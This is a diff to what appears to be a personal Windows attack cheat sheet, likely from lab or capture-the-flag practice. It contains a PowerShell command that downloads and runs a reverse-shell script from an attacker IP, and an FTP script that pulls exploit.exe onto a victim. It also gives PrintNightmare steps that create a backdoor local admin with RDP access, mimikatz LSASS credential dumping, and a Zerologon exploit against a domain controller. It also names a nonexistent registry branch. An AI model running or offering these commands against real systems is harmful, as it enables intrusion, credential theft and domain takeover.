@@ -11,12 +11,16 @@
 
     $ systeminfo // gives system info
 
+    $ tree /a /f // tree structure of folders
+
     We can pipe and grep like linux:
     $ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 
     $ help {command} // is like man {command} on linux
 
     $ net users // gives list of users on the system
+
+    $ net localgroup // gives list of groups
 
     $ set // gives environment variables
 
@@ -46,6 +50,8 @@
 
     python3 -m pyftpdlib -p 21
       // on host
+    python3 -m pyftpdlib -p 21 -w
+      // to enable write access ("put my_file.txt")
 
     echo open 10.10.14.5 > ftp.txt & echo USER anonymous >> ftp.txt && echo PASS anonymous >> ftp.txt & echo binary >> ftp.txt & echo GET exploit.exe >> ftp.txt & echo BYE >> ftp.txt & ftp -n -v -s:ftp.txt
       // on victim
@@ -66,3 +72,50 @@
 
     powershell iex(new-object net.webclient).downloadstring('http://10.10.14.45:8000/Invoke-PowerShellTcp.ps1')
         // WORKS GREAT
+
+    check for PrinterNightmare if Print spooler is enabled:
+        - run services.msc and search for "print spooler"
+        - https://github.com/calebstewart/CVE-2021-1675
+        - PS> Import-Module .\cve-2021-1675.ps1
+        - PS> Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
+        - Open a powershell as admin with "adm1n" account
+        - (OR PS> runas /user:adm1n powershell.exe # not good enough to add adm1n in rdp users)
+        - PS> Add-LocalGroupMember -Group "Remote Desktop Users" -Member "adm1n" 
+
+***********
+** LSASS **
+***********
+    
+    You can have several ways to get lsass dump:
+    - use mimikatz directly
+    - use procdump
+    - use task manager (didn't work for me last time I tried, the dump couldn't be parsed by mimikatz
+                        nor pypykatz)
+
+        MIMIKATZ
+
+    LSASS
+        sekurlsa::logonPasswords full
+
+        ZEROLOGON (check with MIMIKATZ)
+
+    check if vulnerable
+        lsadump::Zerologon /target:DC_NAME /account:DC_NAME$ /null /ntlm 
+
+    exploit
+        lsadump::Zerologon /target:DC_NAME /account:DC_NAME$ /null /ntlm /exploit
+
+        PYPYKATZ
+
+    $ pypykatz lsa minidump lsass.dmp
+
+    
+
+*****************
+** INTERESTING **
+*****************
+
+    The NTUSER.dat file is one of the Registry files. Unlike the other Registry files, NTUSER.DAT is stored in your personal Documents and Settings folder and contains the entire contents of the HKEY_LOCAL_USER branch of the Registry. 
+
+    If a hash contains the string 0XAAD3B435B51404EE, it is most likely a
+    LM hash, and it means the password that produced the hash is 7 chars or less
